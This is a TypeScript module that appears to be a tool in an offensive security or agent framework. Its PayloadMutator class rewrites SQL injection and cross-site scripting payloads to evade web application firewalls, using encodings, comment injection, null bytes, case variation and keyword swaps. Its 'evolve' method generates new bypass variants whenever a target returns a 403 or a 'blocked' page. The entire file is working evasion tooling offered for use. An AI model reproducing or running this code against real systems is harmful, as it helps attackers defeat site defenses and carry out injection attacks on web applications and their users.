import { createSubsystemLogger } from "../logging/subsystem.js";

const log = createSubsystemLogger("tools/payload_mutator");

/**
 * PayloadMutator: Advanced polymorphic transformations for exploit evasion.
 */
export class PayloadMutator {
    /**
     * Mutates a base payload using various encoding and obfuscation techniques.
     */
    mutate(payload: string, technique: string): string {
        log.info(`Applying mutation technique: ${technique}`);

        switch (technique.toLowerCase()) {
            case "url_encode":
                return encodeURIComponent(payload);
            case "double_url_encode":
                return encodeURIComponent(encodeURIComponent(payload));
            case "html_entity_encode":
                return this.htmlEntityEncode(payload);
            case "base64":
                return Buffer.from(payload).toString("base64");
            case "hex":
                return this.toHex(payload);
            case "unicode_escape":
                return this.unicodeEscape(payload);
            case "case_variation":
                return this.caseVariation(payload);
            case "comment_injection_sql":
                return payload.replace(/\s+/g, "/**/");
            case "null_byte_injection":
                return payload + "%00";
            case "waf_bypass_sql":
                return payload.replace(/OR/gi, "||").replace(/AND/gi, "&&").replace(/=/g, " LIKE ");
            case "waf_bypass_xss":
                return payload.replace(/<script>/gi, "<sCrIpT>").replace(/alert/gi, "confirm");
            default:
                return payload;
        }
    }

    private htmlEntityEncode(str: string): string {
        return str.replace(/./gm, (s) => `&#${s.charCodeAt(0)};`);
    }

    private toHex(str: string): string {
        return Array.from(str)
            .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
            .join('');
    }

    private unicodeEscape(str: string): string {
        return Array.from(str)
            .map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`)
            .join('');
    }

    private caseVariation(str: string): string {
        return Array.from(str)
            .map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase())
            .join('');
    }

    /**
     * Evolves a payload based on feedback from a target defense layer.
     */
    evolve(payload: string, response: { status: number, body: string }): string[] {
        const mutations: string[] = [];

        if (response.status === 403) {
            mutations.push(this.mutate(payload, "double_url_encode"));
            mutations.push(this.mutate(payload, "unicode_escape"));
            mutations.push(this.mutate(payload, "case_variation"));
        }

        if (response.body.toLowerCase().includes("waf") || response.body.toLowerCase().includes("blocked")) {
            mutations.push(this.mutate(payload, "comment_injection_sql"));
            mutations.push(this.mutate(payload, "waf_bypass_xss"));
            mutations.push(this.mutate(payload, "null_byte_injection"));
        }

        return mutations;
    }
}

export async function mutatePayload(args: { payload: string, technique: string }) {
    const mutator = new PayloadMutator();
    return mutator.mutate(args.payload, args.technique);
}
